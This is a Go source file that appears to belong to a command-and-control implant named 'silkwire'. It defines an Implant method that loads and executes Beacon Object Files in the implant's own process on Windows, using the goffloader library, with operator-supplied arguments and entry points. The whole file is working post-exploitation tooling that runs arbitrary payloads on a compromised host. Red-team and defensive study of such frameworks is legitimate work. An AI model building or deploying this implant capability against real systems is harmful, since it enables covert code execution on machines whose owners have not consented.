//go:build windows
// +build windows

package main

import (
	"encoding/json"
	"fmt"

	pb "silkwire/proto"

	"github.com/praetorian-inc/goffloader/src/coff"
	"github.com/praetorian-inc/goffloader/src/lighthouse"
)

// ExecuteBOF executes a Beacon Object File using goffloader
// Only supports in-process execution
func (i *Implant) ExecuteBOF(bofBytes []byte, options *pb.BOFOptions) ([]byte, error) {
	if len(bofBytes) == 0 {
		return nil, fmt.Errorf("no BOF data provided")
	}

	return i.ExecuteBOFInProcess(bofBytes, options)
}

// ExecuteBOFInProcess executes a BOF directly in the implant process
// WARNING: BOF crashes/exits will kill the implant - use with caution
func (i *Implant) ExecuteBOFInProcess(bofBytes []byte, options *pb.BOFOptions) ([]byte, error) {
	// Pack arguments using lighthouse type-prefix system
	var argBytes []byte
	var err error
	if options != nil && len(options.Arguments) > 0 {
		argBytes, err = lighthouse.PackArgs(options.Arguments)
		if err != nil {
			return nil, fmt.Errorf("failed to pack BOF arguments: %v", err)
		}
	}

	// Determine entry point
	entryPoint := "go" // Default entry point
	if options != nil && options.EntryPoint != "" {
		entryPoint = options.EntryPoint
	}

	// Execute BOF
	var output string
	if entryPoint == "go" {
		output, err = coff.Load(bofBytes, argBytes)
	} else {
		output, err = coff.LoadWithMethod(bofBytes, argBytes, entryPoint)
	}

	if err != nil {
		return nil, fmt.Errorf("BOF execution failed: %v", err)
	}

	// Build result
	result := map[string]interface{}{
		"method":       "in-process-goffloader",
		"output":       output,
		"output_bytes": len(output),
		"entry_point":  entryPoint,
		"bof_size":     len(bofBytes),
	}

	if options != nil && len(options.Arguments) > 0 {
		result["arguments"] = options.Arguments
	}

	return json.Marshal(result)
}
